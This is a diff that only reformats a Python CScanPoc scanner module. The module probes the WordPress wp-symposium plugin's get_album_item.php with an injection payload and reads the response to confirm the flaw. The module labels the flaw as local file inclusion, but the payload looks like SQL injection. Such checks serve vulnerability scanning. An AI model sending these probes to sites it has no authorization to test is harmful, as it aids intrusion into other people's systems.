@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'WordPress_0032' # 平台漏洞编号，留空
+    vuln_id = 'WordPress_0032'  # 平台漏洞编号，留空
     name = 'WordPress plugins/wp-symposium 本地文件包含'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.LFI # 漏洞类型
+    type = VulnType.LFI  # 漏洞类型
     disclosure_date = '2015-06-08'  # 漏洞公布时间
     desc = '''
         WordPress是一款开源的内容管理系统。
@@ -26,6 +27,7 @@ class Vuln(ABVuln):
     product = 'WordPress'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '69326e54-9a7b-4e38-ad4d-57f5a3ec1569'
     author = '47bwy'  # POC编写者
@@ -38,13 +40,13 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            payload='/wp-content/plugins/wp-symposium/get_album_item.php?size=md5(1);--'
+
+            payload = '/wp-content/plugins/wp-symposium/get_album_item.php?size=md5(1);--'
             verify_url = self.target + payload
             #code, head, res, errcode, _ = curl.curl(url)
             r = requests.get(verify_url)
             if r.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in r.content:
-                #security_hole(url)
+                # security_hole(url)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -53,6 +55,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
